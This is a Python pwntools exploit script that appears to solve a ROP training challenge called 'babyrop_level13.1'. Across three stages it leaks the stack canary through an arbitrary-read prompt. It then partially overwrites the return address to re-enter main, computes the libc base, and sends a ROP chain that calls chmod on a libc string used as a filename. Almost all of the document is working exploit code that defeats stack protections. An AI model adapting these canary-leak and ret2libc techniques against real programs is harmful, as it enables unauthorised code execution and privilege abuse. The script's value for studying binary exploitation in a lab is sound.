"""
1. We got 2 things, STACK_ADDR LEAK (INPUT_ADDR) and ARBITRARY READ, ALL MEMORY PROTECTION ON!
2. Using STACK_ADDR (INPUT_ADDR + 88 = CANARY on STACK) LEAK we further leaked CANARY with Arbitrary read to bypass CANARY PROTECTION.
3. THEN WE NOTICED MAIN() WAS RETURNING TO __LIBC_START_MAIN i.e it was returning somewhere in LIBC and we can overflow ret_addr.
4. So we found an offset in __LIBC_START_MAIN (around ret_addr) that goes back to main(); We got canary and we can go back to main() now.
5. In Stage-2, we get the address of __LIBC_START_MAIN and do some shady calculation of offsets while debugging and got ourselves libc base.
6. In Stage-3, we just construct a ROP chain with everything that we go!
"""

from pwn import *

p = process("./babyrop_level13.1", env={})

print(p.recvuntil(b"[LEAK] Your input buffer is located at: "))
input_buff = int(p.recvline().split(b".")[0], 16)

print("[+] Leaked Input Addr :: " + hex(input_buff))

print(p.recvuntil(b"Address in hex to read from:\n"))
p.sendline(
    hex(input_buff + 88).encode()
)  # find where canary might be located relative to input

print(p.recvuntil(b"= "))
leaked_canary = int(p.recvline().split(b"\n")[0], 16)

print("[+] Leaked Canary :: " + hex(leaked_canary))

payload = b""
payload += b"A" * 88  # buffer
payload += p64(leaked_canary)  # canary
payload += b"B" * 8  # saved_rbp
"""
Below will take you back to main()
0x00007efce9d6bc56 <+38>:    lea    rdi,[rsp+0x20]                                                                    
0x00007efce9d6bc5b <+43>:    call   0x7efce9d81aa0 <__GI__setjmp>
"""
payload += b"\x56" + b"\x6c"  # to restart and goto main()

p.send(payload)

print()
print("::STAGE-2::")
print()

print(p.recvuntil(b"[LEAK] Your input buffer is located at: "))
input_buff = int(p.recvline().split(b".")[0], 16)

print("[+] Leaked Input Addr :: " + hex(input_buff))

print(p.recvuntil(b"Address in hex to read from:\n"))
p.sendline(hex(input_buff + 104).encode())  # leak libc_start_call_main i.e ret_addr

# Manual analysis led to libc_start_call_main @ 0x29c30 offset from base libc addr

print(p.recvuntil(b"= "))
libc_start_call_main_addr_plus_120 = int(p.recvline().split(b"\n")[0], 16)

print(
    "[+] __libc_start_call_main() @ :: " + hex(libc_start_call_main_addr_plus_120 - 120)
)

libc_addr = (
    libc_start_call_main_addr_plus_120 - 0x29C30 - 120
)  # 120 because this leaked addr is +120 ahead of libc_start_call_main

print("[+] libc base address @ :: " + hex(libc_addr))

payload = b""
payload += b"A" * 88  # buffer
payload += p64(leaked_canary)  # canary
payload += b"B" * 8  # saved_rbp
payload += b"\x56" + b"\x6c"  # to restart and goto main()

p.send(payload)

print()
print("::STAGE-3::")
print()

chmod_addr = libc_addr + 0xFF700  # offset of chmod @ libc
pop_rdi_ret = libc_addr + 0x2A145  # offset of pop rdi; ret @ libc
pop_rsi_ret = libc_addr + 0x2BAA9  # offset of pop rsi; ret @ libc
fchflags_str = libc_addr + 0x1F1ED  # string "fchflags" offset @ libc

# just to continue
print(p.recvuntil(b"Address in hex to read from:\n"))
p.sendline(hex(fchflags_str).encode())

print("[+] chmod_addr base address @ :: " + hex(chmod_addr))
print("[+] pop_rdi_ret base address @ :: " + hex(pop_rdi_ret))
print("[+] pop_rsi_ret base address @ :: " + hex(pop_rsi_ret))
print("[+] fchflags_str base address @ :: " + hex(fchflags_str))

payload = b""
payload += b"A" * 88  # buffer
payload += p64(leaked_canary)  # canary
payload += b"B" * 8  # saved_rbp
payload += p64(pop_rdi_ret)  # rdi as arg to chmod()
payload += p64(fchflags_str)  # rdi = char filename*
payload += p64(pop_rsi_ret)  # rsi as arg to chmod()
payload += p64(0x4)  # rsi = 0x4 (mode)
payload += p64(chmod_addr)

p.send(payload)

print(p.clean())

pause()

p.close()
